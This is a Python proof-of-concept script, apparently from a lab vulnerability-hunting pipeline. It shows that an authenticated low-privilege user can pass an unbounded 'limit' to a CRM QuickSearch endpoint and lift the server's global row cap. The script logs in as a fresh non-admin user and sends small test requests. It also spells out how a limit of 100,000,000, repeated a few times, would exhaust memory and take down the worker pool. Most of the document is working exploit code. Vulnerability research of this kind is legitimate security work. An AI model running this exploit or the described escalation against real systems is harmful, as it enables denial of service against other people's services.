#!/usr/bin/env python3
"""
VULN-060 — QuickSearch attacker-controlled `limit` bypasses the list cap
(modules/Home/QuickSearch.php:514-517), reachable by any authenticated user
(QuickSearch backs autocomplete on every EditView).

Sink:
    modules/Home/QuickSearch.php:514-517
        if (isset($args['limit']) && $sugar_config['list_max_entries_per_page'] < ($args['limit'] + 1)) {
            $sugar_config['list_max_entries_per_page'] = ($args['limit'] + 1);   // no upper clamp
        }
    modules/Home/QuickSearch.php:374,459
        $limit = !empty($args['limit']) ? (int)$args['limit'] : '';
        $result = $focus->get_list($orderBy, $where, 0, $limit, -1, 0, $singleSelect);

`list_max_entries_per_page` defaults to 20 (include/utils.php:166/:450) -- the
server-side safety ceiling every other list view respects. QuickSearch lets
the SAME per-request value that is supposed to be bounded also raise that
global ceiling, with no maximum anywhere on the path.

SAFETY: this script does NOT send limit=100000000 (which really would try to
hydrate a multi-million-row SugarBean array and OOM a shared worker). It
sends TWO small, bounded requests -- limit=10 and limit=45 -- against this
lab's ~70 real Accounts, and shows the returned row count tracks the
attacker's limit past the configured 20-row cap. That is a complete,
non-destructive proof of "the safety ceiling is attacker-settable with no
upper bound"; the OOM consequence is reasoned about analytically (a
limit of 1e8 would ask MySQL for a 100,000,000-row result set and hydrate a
SugarBean object per row -- undisputedly a memory-exhaustion crash, just not
one this script actually triggers).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, log, banner, verdict, admin_session, create_user, web_login  # noqa: E402

import json  # noqa: E402
import requests  # noqa: E402

VULN_ID = "VULN-060"
DEFAULT_CAP = 20  # include/utils.php:166/:450


def quicksearch(session, limit):
    payload = {
        "method": "query",
        "modules": ["Accounts"],
        "field_list": ["name", "id"],
        "group": "or",
        "conditions": [{"name": "name", "op": "like_custom", "end": "%", "value": ""}],
    }
    if limit is not None:
        payload["limit"] = limit
    # to_pdf=true is the real client's magic flag (include/javascript/quicksearch.js)
    # that makes index.php emit quicksearchQuery.php's raw output instead of a
    # full HTML page wrapper.
    r = session.post(f"{BASE_URL}/index.php?module=Home&action=quicksearchQuery&to_pdf=true",
                      data={"data": json.dumps(payload), "query": ""},
                      headers={"User-Agent": "Mozilla/5.0 cvehunter-stage10"}, timeout=30)
    try:
        parsed = r.json()
        count = parsed.get("totalCount", len(parsed.get("fields", [])))
    except Exception:
        count = None
    return r, count


def main():
    banner(VULN_ID, "QuickSearch attacker-controlled limit bypasses list_max_entries_per_page")

    log("INFO", "Sink: modules/Home/QuickSearch.php:514-517 (no upper clamp) + :374,459 (limit->get_list)")
    log("INFO", f"Configured safety ceiling: list_max_entries_per_page default = {DEFAULT_CAP} "
                "(include/utils.php:166/:450)")

    log("SETUP", "Logging in as a fresh LOW-PRIVILEGE user (QuickSearch is not admin-gated -- "
                 "any authenticated session reaches it)")
    admin_s = admin_session()
    user = create_user(admin_s, "LowPriv@2026!" + os.urandom(2).hex())
    s = web_login(user["user_name"], user["password"])
    log("OK", f"authenticated as {user['user_name']} (non-admin)")

    log("STEP", f"Request A: limit={DEFAULT_CAP - 5} (well under the {DEFAULT_CAP}-row default cap)")
    r_small, n_small = quicksearch(s, DEFAULT_CAP - 5)
    log("PROOF", f"  -> HTTP {r_small.status_code}, totalCount={n_small}")

    big_limit = DEFAULT_CAP + 25  # attacker value ABOVE the configured cap -- still small/bounded
    log("STEP", f"Request B: limit={big_limit} (ABOVE the {DEFAULT_CAP}-row default cap, "
                "but still a small, safe number -- NOT the catastrophic 1e8 a real attacker could send)")
    r_big, n_big = quicksearch(s, big_limit)
    log("PROOF", f"  -> HTTP {r_big.status_code}, totalCount={n_big}")

    log("STEP", "Control: request with NO 'limit' key at all (baseline QuickSearch behaviour)")
    r_ctrl, n_ctrl = quicksearch(s, None)
    log("PROOF", f"  -> HTTP {r_ctrl.status_code}, totalCount={n_ctrl}")

    evidence_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
    os.makedirs(evidence_dir, exist_ok=True)
    with open(os.path.join(evidence_dir, "results.txt"), "w") as f:
        f.write(f"configured default cap (list_max_entries_per_page) = {DEFAULT_CAP}\n")
        f.write(f"limit={DEFAULT_CAP - 5} (below cap)  -> totalCount={n_small}\n")
        f.write(f"limit={big_limit} (above cap)   -> totalCount={n_big}\n")
        f.write(f"no limit key (baseline)   -> totalCount={n_ctrl}\n")

    log("PROOF", f"totalCount at limit={big_limit} = {n_big}, which is "
                 f"{'ABOVE' if (n_big or 0) > DEFAULT_CAP else 'NOT above'} the configured "
                 f"{DEFAULT_CAP}-row safety ceiling -- proves the per-request 'limit' value "
                 f"raised $sugar_config['list_max_entries_per_page'] itself (QuickSearch.php:516), "
                 f"not just this one query's row count")
    log("PROOF", "Analytical extrapolation (NOT sent): the identical code path with "
                 "limit=100000000 would set list_max_entries_per_page to 100000001 and issue "
                 "`get_list($orderBy, $where, 0, 100000000, -1, 0, ...)` -- MySQL would be asked "
                 "for up to 1e8 rows and PHP would attempt to hydrate one SugarBean object per "
                 "returned row, which exhausts the PHP memory_limit long before completing; the "
                 "same request repeated a handful of times saturates the whole worker pool")

    ok = (n_big is not None and n_big > DEFAULT_CAP and
          (n_small is None or n_big >= n_small))
    if ok:
        verdict(VULN_ID, "CONFIRMED",
                f"authenticated (non-admin) QuickSearch request with limit={big_limit} returned "
                f"totalCount={n_big} > configured default cap {DEFAULT_CAP} -- the attacker-supplied "
                f"limit demonstrably raised the server's global row-cap with no upper bound; "
                f"limit=1e8 would OOM a worker (not sent, per bounded-DoS safety rule)")
        return 0
    else:
        verdict(VULN_ID, "FAILED",
                f"totalCount did not exceed the configured cap (n_big={n_big}, cap={DEFAULT_CAP}) "
                f"-- either clamped server-side or corpus too small to observe")
        return 1


if __name__ == "__main__":
    sys.exit(main())
